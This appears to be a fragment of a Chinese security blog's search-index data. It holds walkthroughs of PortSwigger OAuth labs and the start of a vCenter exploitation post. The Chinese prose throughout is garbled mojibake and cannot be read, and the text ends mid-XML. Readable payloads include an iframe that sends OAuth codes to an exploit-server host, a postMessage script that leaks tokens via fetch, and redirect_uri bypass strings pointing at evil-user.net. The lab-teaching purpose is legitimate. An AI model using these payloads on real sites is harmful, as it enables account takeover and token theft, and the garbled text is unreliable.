ä»¤ç‰Œçš„ä½¿ç”¨ ç¬¬ä¸‰æ–¹ç½‘ç«™æ‹¿åˆ°ä»¤ç‰Œä»¥åï¼Œå°±å¯ä»¥å‘ Github çš„ API è¯·æ±‚æ•°æ®äº†ã€‚ æ­¤æ—¶ï¼Œæ¯ä¸ªå‘åˆ° API çš„è¯·æ±‚ï¼Œéƒ½å¿…é¡»å¸¦æœ‰ä»¤ç‰Œã€‚å…·ä½“åšæ³•æ˜¯åœ¨è¯·æ±‚çš„å¤´ä¿¡æ¯ï¼ŒåŠ ä¸Šä¸€ä¸ªAuthorizationå­—æ®µï¼Œä»¤ç‰Œå°±æ”¾åœ¨è¿™ä¸ªå­—æ®µé‡Œé¢ã€‚ curl -H \"Authorization: Bearer ACCESS_TOKEN\" \\ \"https://github.com\" ","date":"2023-05-01","objectID":"/2023/05/oauth-2.0%E5%8D%8F%E8%AE%AE%E5%8F%8A%E6%BC%8F%E6%B4%9E/:1:4","tags":["äº‘åŸç”Ÿå®‰å…¨","OAuth"],"title":"OAuth 2.0åè®®åŠæ¼æ´","uri":"/2023/05/oauth-2.0%E5%8D%8F%E8%AE%AE%E5%8F%8A%E6%BC%8F%E6%B4%9E/"},{"categories":["äº‘åŸç”Ÿå®‰å…¨"],"content":"2 OAuth2.0 è®¤è¯æ¼æ´ ","date":"2023-05-01","objectID":"/2023/05/oauth-2.0%E5%8D%8F%E8%AE%AE%E5%8F%8A%E6%BC%8F%E6%B4%9E/:2:0","tags":["äº‘åŸç”Ÿå®‰å…¨","OAuth"],"title":"OAuth 2.0åè®®åŠæ¼æ´","uri":"/2023/05/oauth-2.0%E5%8D%8F%E8%AE%AE%E5%8F%8A%E6%BC%8F%E6%B4%9E/"},{"categories":["äº‘åŸç”Ÿå®‰å…¨"],"content":"2.1 OAuth å®¢æˆ·ç«¯åº”ç”¨ç¨‹åºçš„æ¼æ´ 2.1.1 Authentication bypass via OAuth implicit flow é¶åœºåœ°å€ï¼šhttps://portswigger.net/web-security/oauth/lab-oauth-authentication-bypass-via-oauth-implicit-flow å‰é¢çš„ç« èŠ‚ä¸­æè¿°è¿‡éšå¼æˆæƒå¸¸ç”¨äºç›´æ¥å‘å‰ç«¯é¢å‘ä»¤ç‰Œã€‚åœ¨è¿™ä¸ªæµç¨‹ä¸­ï¼Œè®¿é—®ä»¤ç‰Œæ˜¯é€šè¿‡ç”¨æˆ·çš„æµè§ˆå™¨ä»¥ URL å‚æ•°çš„å½¢å¼ä» OAuth æœåŠ¡å‘é€åˆ°å®¢æˆ·ç«¯åº”ç”¨ç¨‹åºçš„ã€‚ç„¶åï¼Œå®¢æˆ·ç«¯åº”ç”¨ç¨‹åºä½¿ç”¨ JavaScript è®¿é—®è¯¥ä»¤ç‰Œã€‚é—®é¢˜æ˜¯ï¼Œå¦‚æœåº”ç”¨ç¨‹åºæƒ³åœ¨ç”¨æˆ·å…³é—­é¡µé¢åä¿æŒä¼šè¯ï¼Œå®ƒéœ€è¦åœ¨æŸä¸ªåœ°æ–¹å­˜å‚¨å½“å‰çš„ç”¨æˆ·æ•°æ®ã€‚ ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œå®¢æˆ·ç«¯åº”ç”¨ç¨‹åºé€šå¸¸ä¼šåœ¨ä¸€ä¸ª POST è¯·æ±‚ä¸­æŠŠè¿™äº›æ•°æ®æäº¤ç»™æœåŠ¡å™¨ï¼Œç„¶åç»™ç”¨æˆ·åˆ†é…ä¸€ä¸ªä¼šè¯ cookieã€‚è¿™ä¸ªè¯·æ±‚ç±»æ¯”åŸºäºå¯†ç éªŒè¯çš„è¡¨å•æäº¤è¯·æ±‚ã€‚ç„¶è€Œï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼ŒæœåŠ¡å™¨æ²¡æœ‰å¯¹ token ä¸ç”¨æˆ· id è¿›è¡Œæ¯”è¾ƒä¸é‰´åˆ«ï¼Œå› æ­¤å­˜åœ¨é£é™©ã€‚ é¶åœºä¸­ç›¸å…³çš„æ•°æ®åŒ…å¦‚ä¸‹ï¼š é¦–å…ˆæºå¸¦ client_id è®¿é—® auth è·¯ç”±å‘è®¤è¯æœåŠ¡ç«¯è¯·æ±‚æˆæƒï¼š ä¹‹åé‡å®šå‘ url, ç„¶åè¾“å…¥äº†è´¦å·å¯†ç è¿›è¡Œè®¤è¯ï¼š è·å– access_tokenï¼š /oauth-callback è·¯ç”±ä¸‹è·å–åˆ° Ajax çš„è¯·æ±‚ä¿¡æ¯ï¼š é¦–å…ˆä¼šè¯·æ±‚ /me å»éªŒè¯è®¿é—®æƒé™ï¼Œå†å‘ /authenticate è·¯ç”±å‘é€å¯¹åº”ä¿¡æ¯ï¼Œè·å–æŒä¹…åŒ– Cookieï¼š å°† email ä¿®æ”¹ä¸ºï¼šcarlos@carlos-montoya.netï¼Œå³å¯å®ç°è¶Šæƒï¼š 2.1.2 Flawed CSRF protection è¿™ä¸ªæ¼æ´çš„ä¸»è¦æˆå› æ˜¯é”™è¯¯é…ç½® OAuth ç»„ä»¶ï¼Œæ¯”å¦‚è¯´ state å‚æ•°çš„é…ç½®ï¼Œè¿™ä¸ªå‚æ•°ä¸€èˆ¬éƒ½æ˜¯ä¸ä¼šè¯ä¿¡æ¯ç›¸å…³è”çš„ä¸€ä¸ª hash å€¼ï¼Œåœ¨æœåŠ¡ç«¯å’Œå®¢æˆ·ç«¯ä¹‹é—´æ¥å›ä¼ é€’ï¼Œä½œä¸ºå®¢æˆ·ç«¯çš„CSRFä»¤ç‰Œã€‚ é¶åœºåœ°å€ï¼šhttps://portswigger.net/web-security/oauth/lab-oauth-forced-oauth-profile-linking é¦–å…ˆä½¿ç”¨ wiener:peter è´¦å·ç™»å½•ï¼Œç‚¹å‡» Attach a social profileï¼š redirect_uriä¸­å°†æˆæƒä»£ç å‘é€åˆ°äº†/oauth-linkingè·¯ç”±ä¸­ï¼Œç‰¹åˆ«çš„æ˜¯ï¼Œè¿™é‡Œå¹¶æ²¡æœ‰ state å‚æ•°çš„å­˜åœ¨ï¼Œå­˜åœ¨æœ‰ CSRF æ¼æ´ é‡æ–°ç”Ÿæˆä¸€ä¸ªæœ‰æ•ˆ codeï¼š æ„é€  csrf è¯·æ±‚ï¼š é‡æ–°ä½¿ç”¨ç¤¾äº¤åª’ä½“è´¦å·ç™»å½•ï¼Œè·å– admin æƒé™ï¼Œå³å®ç°ç”¨æ”»å‡»è€…çš„ç¤¾äº¤åª’ä½“è´¦å·ç»‘å®šç®¡ç†å‘˜çš„ç½‘ç«™è´¦å·ï¼š ","date":"2023-05-01","objectID":"/2023/05/oauth-2.0%E5%8D%8F%E8%AE%AE%E5%8F%8A%E6%BC%8F%E6%B4%9E/:2:1","tags":["äº‘åŸç”Ÿå®‰å…¨","OAuth"],"title":"OAuth 2.0åè®®åŠæ¼æ´","uri":"/2023/05/oauth-2.0%E5%8D%8F%E8%AE%AE%E5%8F%8A%E6%BC%8F%E6%B4%9E/"},{"categories":["äº‘åŸç”Ÿå®‰å…¨"],"content":"2.2 ç¼ºå°‘æˆæƒç å’Œè®¿é—®ä»¤ç‰Œ æ ¹æ® RFC æ–‡æ¡£ï¼Œè·å–åˆ°çš„ token å°†è¢«å‘é€åˆ°æˆæƒè¯·æ±‚çš„ redirect_uri å‚æ•°ä¸­çš„ä½ç½®ï¼Œå¦‚æœæœåŠ¡ç«¯æ²¡æœ‰æ­£ç¡®çš„æ ¡éªŒè¿™ä¸ªURIï¼Œæ”»å‡»è€…å°±èƒ½å¤Ÿé€šè¿‡è¿™ä¸ªæ¼æ´å°†å®¢æˆ·ç«¯çš„ codes å’Œ token å‘é€åˆ°æ”»å‡»è€…æ§åˆ¶çš„ redirect_uri å‚æ•°æŒ‡å®šä½ç½®ã€‚é‚£ä¹ˆæ”»å‡»è€…å°±å¯ä»¥åˆ©ç”¨è¿™äº›ä¿¡æ¯å‘é€åˆ°æœåŠ¡ç«¯åˆæ³•çš„ redirect_uri åœ°å€ä¸­ï¼Œå°±èƒ½æˆåŠŸè·å–ç”¨æˆ·çš„è´¦æˆ·çš„è®¿é—®æƒé™ã€‚ 2.2.1 Flawed redirect_uri validation é¶åœºåœ°å€ï¼šhttps://portswigger.net/web-security/oauth/lab-oauth-account-hijacking-via-redirect-uri ç¬¬ä¸€æ¬¡ç™»å½•ï¼š é€€å‡ºåé‡æ–°ç™»å½•ï¼š ä¿®æ”¹ redirect_uriï¼šhttps://exploit-0ad8005303814d4180b43e2501ed0024.exploit-server.net/exploit æ„é€  CSRF è¯·æ±‚ Payloadï¼š\u003ciframe src=\"https://oauth-0a8500b803764d57807c3d2b02cd0008.oauth-server.net/auth?client_id=r9sfjw4x66elhfvknv296\u0026redirect_uri=https://exploit-0ad8005303814d4180b43e2501ed0024.exploit-server.net/exploit\u0026response_type=code\u0026scope=openid%20profile%20email\"\u003e\u003c/iframe\u003e åœ¨æ—¥å¿—ä¸­è·å–ç®¡ç†å‘˜ tokenï¼š åˆ©ç”¨ç®¡ç†å‘˜ token è¿›è¡Œç™»å½•ï¼š 2.2.2 Flawed redirect_uri validation æœ‰äº› OAuth æœåŠ¡æˆ–å¯¹redirect_uri å‚æ•°å¼€å¯ç™½åå•æ ¡éªŒï¼Œå¦‚æœæ ¡éªŒè§„åˆ™å­˜åœ¨é—®é¢˜ï¼ŒåŒæ ·å¯ä»¥ç»•è¿‡ï¼Œæ¯”å¦‚ï¼š ç»•è¿‡å­—ç¬¦ä¸²åŒ¹é…ï¼š https://default-host.com \u0026@foo.evil-user.net#@bar.evil-user.net/ æäº¤é‡å¤çš„ redirect_uri å‚æ•°æ£€æµ‹æ˜¯å¦å­˜åœ¨æœåŠ¡ç«¯å‚æ•°æ±¡æŸ“æ¼æ´ï¼š https://oauth-authorization-server.com/?client_id=123\u0026redirect_uri=client-app.com/callback\u0026redirect_uri=evil-user.net 2.2.3 Stealing OAuth access tokens via an open redirect é¶åœºåœ°å€ï¼šhttps://portswigger.net/web-security/oauth/lab-oauth-stealing-oauth-access-tokens-via-an-open-redirect åœ¨è¿™ä¸ªç¯å¢ƒä¸­ï¼Œredirect_uri ä¸èƒ½ä¼ é€’åˆ°å¤–éƒ¨åŸŸå½“ä¸­ï¼Œå°è¯•è·å–æ–°çš„ç»•è¿‡æ–¹å¼ã€‚ å¯»æ‰¾ç½‘ç«™è‡ªèº« URL é‡å®šå‘æ¼æ´ï¼Œå…¶ä¸­ path å‚æ•°å¯ä»¥ä»»æ„æŒ‡å®šï¼Œå¹¶ä»»æ„è·³è½¬ï¼š é‡æ–°ä¿®æ”¹ redirect_uriï¼Œç»•è¿‡é™åˆ¶ï¼š æäº¤ payloadï¼š æŸ¥çœ‹æ—¥å¿—ï¼Œè·å– codeï¼š è·å– admin api keyï¼š 2.2.4 Stealing codes and access tokens via a proxy page é¶åœºåœ°å€ï¼šhttps://portswigger.net/web-security/oauth/lab-oauth-stealing-oauth-access-tokens-via-a-proxy-page æœ¬ç¯å¢ƒå€ŸåŠ©ç½‘ç«™å‰ç«¯è‡ªèº«ç‰¹æ€§æ¥ç»•è¿‡ redirect_uri çš„é™åˆ¶ è¿™æ®µ JavaScript ä»£ç ä½¿ç”¨ postMessage æ–¹æ³•å‘å½“å‰çª—å£çš„çˆ¶çª—å£å‘é€æ¶ˆæ¯ã€‚ å…·ä½“æ¥è¯´ï¼Œä»£ç ä¸­çš„å‚æ•° {type: 'onload', data: window.location.href} æ˜¯è¦å‘é€çš„æ¶ˆæ¯ä½“ï¼Œå®ƒåŒ…å«äº†ä¸¤ä¸ªå±æ€§ï¼š type: è¡¨ç¤ºæ¶ˆæ¯çš„ç±»å‹ï¼Œè¿™é‡Œæ˜¯ 'onload'ï¼Œå¯èƒ½è¡¨ç¤ºå½“å‰çª—å£å·²ç»åŠ è½½å®Œæ¯•ã€‚ data: è¡¨ç¤ºæ¶ˆæ¯çš„æ•°æ®ï¼Œè¿™é‡Œæ˜¯å½“å‰çª—å£çš„ URL åœ°å€ï¼Œé€šè¿‡ window.location.href è·å–ã€‚ è€Œ '*' è¡¨ç¤ºç›®æ ‡çª—å£çš„æºå¯ä»¥æ˜¯ä»»ä½•å€¼ï¼Œå³ä¸é™åˆ¶å‘é€ç›®æ ‡ã€‚ è¿™ç§æ–¹å¼å¯ä»¥åœ¨è·¨åŸŸçš„æƒ…å†µä¸‹è¿›è¡Œçª—å£ä¹‹é—´çš„é€šä¿¡ï¼Œå¯ä»¥ç”¨äºå®ç°å•é¡µåº”ç”¨ï¼ˆSPAï¼‰ä¸­çš„è·¯ç”±æ§åˆ¶ã€å­çª—å£ä¸çˆ¶çª—å£ä¹‹é—´çš„é€šä¿¡ç­‰åœºæ™¯ã€‚æ¥æ”¶æ¶ˆæ¯çš„çª—å£éœ€è¦ä½¿ç”¨ window.addEventListener æ–¹æ³•ç›‘å¬æ¶ˆæ¯äº‹ä»¶ï¼Œå¹¶åœ¨äº‹ä»¶å¤„ç†å‡½æ•°ä¸­è¿›è¡Œç›¸åº”çš„æ“ä½œã€‚ æ„é€  payloadï¼š \u003ciframe src=\"https://oauth-0a9e0004046695e5808b109b02130039.oauth-server.net/auth?client_id=i68727fixf7k81yma64w4\u0026redirect_uri=https://0acc0028043595bf80f11233008c00a2.web-security-academy.net/oauth-callback/../post/comment/comment-form\u0026response_type=token\u0026nonce=-1552239120\u0026scope=openid%20profile%20email\"\u003e\u003c/iframe\u003e \u003cscript\u003e window.addEventListener('message', function(e) { fetch(\"/\" + encodeURIComponent(e.data.data)) }, false) \u003c/script\u003e è¿™æ®µ JavaScript ä»£ç ä¸­ï¼Œé¦–å…ˆä½¿ç”¨ window.addEventListener æ–¹æ³•ä¸ºå½“å‰çª—å£æ·»åŠ äº†ä¸€ä¸ª message äº‹ä»¶çš„ç›‘å¬å™¨ã€‚å½“æ¥æ”¶åˆ°å…¶ä»–çª—å£é€šè¿‡ postMessage æ–¹æ³•å‘é€è¿‡æ¥çš„æ¶ˆæ¯æ—¶ï¼Œå°±ä¼šè§¦å‘è¿™ä¸ªäº‹ä»¶ï¼Œæ‰§è¡Œåé¢çš„å›è°ƒå‡½æ•°ã€‚ åœ¨å›è°ƒå‡½æ•°ä¸­ï¼Œe å‚æ•°æ˜¯ä¸€ä¸ªäº‹ä»¶å¯¹è±¡ï¼ŒåŒ…å«äº†å‘é€çš„æ¶ˆæ¯å’Œå…¶ä»–ä¿¡æ¯ã€‚å…¶ä¸­ï¼Œe.data å±æ€§è¡¨ç¤ºæ¥æ”¶åˆ°çš„æ¶ˆæ¯å†…å®¹ï¼Œå®ƒåŒ…å«äº†ä¸€ä¸ª data å±æ€§ï¼Œæ˜¯å‘é€çš„æ¶ˆæ¯ä½“ã€‚å› æ­¤ï¼ŒencodeURIComponent(e.data.data) ä¼šå°†æ¥æ”¶åˆ°çš„æ¶ˆæ¯ä½“è½¬æ¢æˆ URL ç¼–ç æ ¼å¼çš„å­—ç¬¦ä¸²ï¼Œå¹¶ä½œä¸ºè·¯å¾„å‚æ•°ï¼Œæ„é€ ä¸€ä¸ª fetch è¯·æ±‚ã€‚ å…·ä½“æ¥è¯´ï¼Œè¿™ä¸ª fetch è¯·æ±‚ä¼šå‘å½“å‰ç½‘ç«™çš„æ ¹è·¯å¾„ï¼ˆ\"/\"ï¼‰å‘é€ä¸€ä¸ª GET è¯·æ±‚ï¼Œè·¯å¾„ä¸­åŒ…å«äº†ä¸€ä¸ª URL ç¼–ç åçš„å­—ç¬¦ä¸²ï¼Œè¿™ä¸ªå­—ç¬¦ä¸²æ˜¯ä¹‹å‰é€šè¿‡ postMessage æ–¹æ³•å‘é€è¿‡æ¥çš„æ¶ˆæ¯ä½“çš„ data å±æ€§å€¼ã€‚ è·å– logï¼Œå¹¶è®¿é—® /me è·¯ç”±è·å– apikeyï¼š ","date":"2023-05-01","objectID":"/2023/05/oauth-2.0%E5%8D%8F%E8%AE%AE%E5%8F%8A%E6%BC%8F%E6%B4%9E/:2:2","tags":["äº‘åŸç”Ÿå®‰å…¨","OAuth"],"title":"OAuth 2.0åè®®åŠæ¼æ´","uri":"/2023/05/oauth-2.0%E5%8D%8F%E8%AE%AE%E5%8F%8A%E6%BC%8F%E6%B4%9E/"},{"categories":["äº‘åŸç”Ÿå®‰å…¨"],"content":"2.3 æœ‰ç¼ºé™·çš„èŒƒå›´éªŒè¯ ç”¨æˆ·éƒ½å¿…é¡»å®šä¹‰æˆæƒçš„èŒƒå›´ï¼Œä½†æ˜¯å­˜åœ¨æŸäº›æ¼æ´å¯¼è‡´æ”»å‡»è€…å¯ä»¥æ‰©å¤§æˆæƒçš„èŒƒå›´ï¼Œè·å¾—æ›´å¤§æƒé™çš„è®¿é—®ä»¤ç‰Œã€‚ 2.3.1 Scope upgrade: authorization code flow ä½¿ç”¨æˆæƒç æˆæƒç±»å‹æ—¶ï¼Œæ”»å‡»è€…çªƒå–åˆ°æˆæƒç ï¼Œç„¶åæ”»å‡»è€…å¯ä»¥åœ¨äº¤æ¢æˆæƒç æˆ–è®¿é—®ä»¤ç‰Œçš„è¯·æ±‚ä¸­å†æ·»åŠ å…¶ä»–çš„èŒƒå›´å€¼ï¼Œå¦‚æœæœåŠ¡å™¨æ²¡æœ‰å¯¹ç¯¡æ”¹çš„èŒƒå›´è¿›è¡ŒéªŒè¯ï¼Œåˆ™æœåŠ¡å™¨ä¼šåˆ©ç”¨æ–°çš„èŒƒå›´åˆ¶ä½œè®¿é—®ä»¤ç‰Œå¹¶å‘æ”¾ç»™å®¢æˆ·ç«¯åº”ç”¨ç¨‹åº ä¾‹å¦‚ï¼Œå‡è®¾æ”»å‡»è€…çš„æ¶æ„å®¢æˆ·ç«¯åº”ç”¨ç¨‹åºæœ€åˆä½¿ç”¨ openid email èŒƒå›´è¯·æ±‚è®¿é—®ç”¨æˆ·çš„ç”µå­é‚®ä»¶åœ°å€ã€‚åœ¨ç”¨æˆ·æ‰¹å‡†æ­¤è¯·æ±‚åï¼Œæ¶æ„å®¢æˆ·ç«¯åº”ç”¨ç¨‹åºå°†æ”¶åˆ°æˆæƒç ã€‚ç”±äºæ”»å‡»è€…æ§åˆ¶ä»–ä»¬çš„å®¢æˆ·ç«¯åº”ç”¨ç¨‹åºï¼Œä»–ä»¬å¯ä»¥å°†å¦ä¸€ä¸ªèŒƒå›´å‚æ•°æ·»åŠ åˆ°ä»£ç  / ä»¤ç‰Œäº¤æ¢è¯·æ±‚ä¸­ï¼ŒåŒ…å«é¢å¤–çš„ profile èŒƒå›´ã€‚ POST /token Host: oauth-authorization-server.com client_id=12345\u0026client_secret=SECRET\u0026redirect_uri=https://client-app.com/callback\u0026grant_type=authorization_code\u0026code=a1b2c3d4e5f6g7h8\u0026scope=openid%20email%20profile å¦‚æœæœåŠ¡å™¨æ²¡æœ‰æ ¹æ®åˆå§‹æˆæƒè¯·æ±‚çš„èŒƒå›´éªŒè¯è¿™ä¸€ç‚¹ï¼Œå®ƒæœ‰æ—¶ä¼šä½¿ç”¨æ–°èŒƒå›´ç”Ÿæˆè®¿é—®ä»¤ç‰Œå¹¶å°†å…¶å‘é€åˆ°æ”»å‡»è€…çš„å®¢æˆ·ç«¯åº”ç”¨ç¨‹åºï¼š { \"access_token\": \"z0y9x8w7v6u5\", \"token_type\": \"Bearer\", \"expires_in\": 3600, \"scope\": \"openid email profile\", â€¦ } 2.3.2 Scope upgrade: implicit flow å¯¹äºéšå¼æˆæƒç±»å‹ï¼Œè®¿é—®ä»¤ç‰Œæ˜¯é€šè¿‡æµè§ˆå™¨å‘é€çš„ï¼Œè¿™æ„å‘³ç€æ”»å‡»è€…å¯ä»¥çªƒå–ä¸å®¢æˆ·ç«¯åº”ç”¨ç¨‹åºç›¸å…³è”çš„ä»¤ç‰Œå¹¶ç›´æ¥ä½¿ç”¨å®ƒä»¬ã€‚ä¸€æ—¦æ”»å‡»è€…çªƒå–äº†è®¿é—®ä»¤ç‰Œï¼Œä»–ä»¬å¯ä»¥å‘ OAuth æœåŠ¡çš„ /userinfo è·¯ç”±å‘é€æ­£å¸¸çš„åŸºäºæµè§ˆå™¨çš„è¯·æ±‚ï¼Œåœ¨æ­¤è¿‡ç¨‹ä¸­æ‰‹åŠ¨æ·»åŠ æ–°çš„èŒƒå›´å‚æ•°ã€‚ ","date":"2023-05-01","objectID":"/2023/05/oauth-2.0%E5%8D%8F%E8%AE%AE%E5%8F%8A%E6%BC%8F%E6%B4%9E/:2:3","tags":["äº‘åŸç”Ÿå®‰å…¨","OAuth"],"title":"OAuth 2.0åè®®åŠæ¼æ´","uri":"/2023/05/oauth-2.0%E5%8D%8F%E8%AE%AE%E5%8F%8A%E6%BC%8F%E6%B4%9E/"},{"categories":["äº‘åŸç”Ÿå®‰å…¨"],"content":"2.4 æœªéªŒè¯çš„ç”¨æˆ·æ³¨å†Œ å½“é€šè¿‡ OAuth è®¤è¯ç”¨æˆ·æ—¶ï¼Œå®¢æˆ·ç«¯åº”ç”¨ç¨‹åºä¼šå‡è®¾ OAuth æä¾›è€…æ‰€å­˜å‚¨çš„ä¿¡æ¯æ˜¯æ­£ç¡®çš„ã€‚è¿™å¯èƒ½æ˜¯ä¸€ä¸ªå±é™©çš„å‡è®¾ã€‚ ä¸€äº›æä¾› OAuth æœåŠ¡çš„ç½‘ç«™å…è®¸ç”¨æˆ·åœ¨æ²¡æœ‰éªŒè¯ä»–ä»¬æ‰€æœ‰ç»†èŠ‚çš„æƒ…å†µä¸‹æ³¨å†Œä¸€ä¸ªè´¦æˆ·ï¼Œåœ¨æŸäº›æƒ…å†µä¸‹åŒ…æ‹¬ä»–ä»¬çš„ç”µå­é‚®ä»¶åœ°å€ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¿™ä¸€ç‚¹ï¼Œä½¿ç”¨ä¸ç›®æ ‡ç”¨æˆ·ç›¸åŒçš„ç»†èŠ‚ï¼Œå¦‚å·²çŸ¥çš„ç”µå­é‚®ä»¶åœ°å€ï¼Œå‘ OAuth æä¾›å•†æ³¨å†Œä¸€ä¸ªè´¦æˆ·ã€‚å®¢æˆ·ç«¯åº”ç”¨ç¨‹åºå¯èƒ½ä¼šå…è®¸æ”»å‡»è€…é€šè¿‡è¿™ä¸ª OAuth æä¾›å•†çš„è´¦æˆ·ä½œä¸ºå—å®³è€…ç™»å½•ã€‚ ","date":"2023-05-01","objectID":"/2023/05/oauth-2.0%E5%8D%8F%E8%AE%AE%E5%8F%8A%E6%BC%8F%E6%B4%9E/:2:4","tags":["äº‘åŸç”Ÿå®‰å…¨","OAuth"],"title":"OAuth 2.0åè®®åŠæ¼æ´","uri":"/2023/05/oauth-2.0%E5%8D%8F%E8%AE%AE%E5%8F%8A%E6%BC%8F%E6%B4%9E/"},{"categories":["äº‘åŸç”Ÿå®‰å…¨"],"content":"å‚è€ƒ RFC 6749 é˜®ä¸€å³° Oauth ç³»åˆ—æ—¥å¿— portswigger oauth ","date":"2023-05-01","objectID":"/2023/05/oauth-2.0%E5%8D%8F%E8%AE%AE%E5%8F%8A%E6%BC%8F%E6%B4%9E/:3:0","tags":["äº‘åŸç”Ÿå®‰å…¨","OAuth"],"title":"OAuth 2.0åè®®åŠæ¼æ´","uri":"/2023/05/oauth-2.0%E5%8D%8F%E8%AE%AE%E5%8F%8A%E6%BC%8F%E6%B4%9E/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"vCenter æ¼æ´åˆ©ç”¨","date":"2022-05-05","objectID":"/2022/05/vcenter%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/","tags":["æ¸—é€æµ‹è¯•"],"title":"vCenter æ¼æ´åˆ©ç”¨","uri":"/2022/05/vcenter%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"vCenter æ¼æ´åˆ©ç”¨ ","date":"2022-05-05","objectID":"/2022/05/vcenter%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/:0:0","tags":["æ¸—é€æµ‹è¯•"],"title":"vCenter æ¼æ´åˆ©ç”¨","uri":"/2022/05/vcenter%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"1 vSphere èƒŒæ™¯ä»‹ç» vSphereï¼ŒESXi å’Œ vCenter è¾¨æï¼š VMware Inc **VMware Inc ** æ˜¯ä¸€å®¶è½¯ä»¶å…¬å¸ã€‚å®ƒå¼€å‘äº†è®¸å¤šäº§å“ï¼Œå°¤å…¶æ˜¯å„ç§äº‘è§£å†³æ–¹æ¡ˆ ã€‚å®ƒçš„äº‘è§£å†³æ–¹æ¡ˆåŒ…æ‹¬äº‘äº§å“ï¼Œæ•°æ®ä¸­å¿ƒäº§å“å’Œæ¡Œé¢äº§å“ç­‰ã€‚ vSphere vSphere æ˜¯åœ¨æ•°æ®ä¸­å¿ƒäº§å“ä¸‹çš„ä¸€å¥—è½¯ä»¶ã€‚vSphere ç±»ä¼¼å¾®è½¯çš„ Office åŠå…¬å¥—ä»¶ï¼ŒOffice åŠå…¬å¥—ä»¶åŒ…å«äº†è®¸å¤šè½¯ä»¶å¦‚ Wordï¼ŒExcelï¼ŒAccess ç­‰ã€‚å’Œ Office ä¸€æ ·ï¼ŒvSphere ä¹Ÿæ˜¯ä¸€ä¸ªè½¯ä»¶çš„é›†åˆã€‚å®ƒåŒ…æ‹¬äº† vCenter Serverï¼Œ ESXi å’Œ vSphere clientï¼Œæ˜¯æ•´å¥—è™šæ‹ŸåŒ–éƒ¨ç½²æ–¹æ¡ˆçš„æ€»å’Œã€‚ ESXi ESXi æ˜¯ vSphere ä¸­æœ€é‡è¦çš„ä¸€ä¸ªç»„ä»¶ã€‚ESXi æ˜¯è™šæ‹ŸåŒ–æœåŠ¡ã€‚æ‰€æœ‰çš„è™šæ‹Ÿæœºéƒ½æ˜¯è¿è¡Œåœ¨ ESXi æœåŠ¡ä¸Šé¢ã€‚ vSphere Client vSphere (web) client æ˜¯ä¸€ä¸ªç®¡ç†å¹³å°ï¼Œå®ƒèƒ½å¤Ÿç›´æ¥ç®¡ç†å¤šä¸ªä¸åŒçš„ ESXi ä¸»æœºï¼ŒåŒ…å«è®¸å¤šè¿›é˜¶åŠŸèƒ½ï¼šé›†ç¾¤æ•…éšœè½¬ç§»ç­‰ã€‚è€Œ ESXi è‡ªå¸¦çš„ç®¡ç†å¹³å°åªèƒ½ç®¡ç†è‡ªèº«æ‰€å¤„çš„ ESXi ä¸»æœºã€‚è€Œ vSphere client æœ‰æ›´åŠ è¯¦ç»†çš„æ€§èƒ½ç›‘æ§ï¼Œæ‰¹é‡æ›´æ–°æ¥ç®¡æ‰€æœ‰ ESXi ç³»ç»Ÿç‰ˆæœ¬ã€‚é€šè¿‡èµ„æºæ± ä¹Ÿå¯ä»¥è§„åˆ’è™šæ‹Ÿæœºèµ„æºå ç”¨ã€‚ vCenter Server åœ¨ ESXi 6.0 ä¹‹å‰æ˜¯é€šè¿‡ C/S æ¶æ„æ¥ç®¡ç† ESXi é›†ç¾¤çš„ï¼Œæ²¡æœ‰ web ç«¯ï¼Œä¸”å®‰è£…ç¯å¢ƒè¾ƒä¸ºè‹›åˆ»ï¼Œå¿…é¡»ä¸º Server ç‰ˆæœ¬çš„æœåŠ¡å™¨æ‰å¯ä»¥å®‰è£…ã€‚åœ¨ 6.0 ç‰ˆæœ¬ä¹‹åï¼Œå®˜æ–¹å·²ç»å–æ¶ˆäº† C/S æ¶æ„çš„å®¢æˆ·ç«¯ï¼Œè½¬è€Œé‡‡ç”¨äº† web ç®¡ç†å¹³å°ï¼Œåˆè¢«ç§°ä¹‹ä¸º vSphere web clientã€‚è€Œéƒ¨ç½²äº† vSphere web client çš„æœåŠ¡å™¨è¢«ç§°ä¹‹ä¸º vCenter Serverã€‚ å®˜æ–¹æ¨èå°†æ‰“åŒ…å¥½çš„ Client ä¸ Server åº”ç”¨éƒ¨ç½²åœ¨ VMware è‡ªå®¶çš„ Photon ç³»ç»Ÿä¸‹ï¼Œå…¶å®‰è£…åŒ…å‘½åä¸ºï¼šVMware vCenter Server Applianceï¼Œç®€ç§°ä¸ºï¼šVCSAã€‚ ","date":"2022-05-05","objectID":"/2022/05/vcenter%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/:1:0","tags":["æ¸—é€æµ‹è¯•"],"title":"vCenter æ¼æ´åˆ©ç”¨","uri":"/2022/05/vcenter%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"2 å¸¸è§æ¼æ´ ","date":"2022-05-05","objectID":"/2022/05/vcenter%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/:2:0","tags":["æ¸—é€æµ‹è¯•"],"title":"vCenter æ¼æ´åˆ©ç”¨","uri":"/2022/05/vcenter%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"2.1 ç‰ˆæœ¬ä¿¡æ¯æ¢æµ‹ é€šè¿‡è°ƒç”¨ VMWare Sphere ç»„ä»¶çš„ SOAP APIï¼Œå¯ä»¥è·å–å…¶ç‰ˆæœ¬ä¿¡æ¯ï¼ŒXML æ•°æ®å¦‚ä¸‹ï¼š \u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e \u003csoap:Envelope xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\u003e \u003csoap:Header\u003e \u003coperationID\u003e00000001-00000001\u003c/operationID\u003e \u003c/soap:Header\u003e 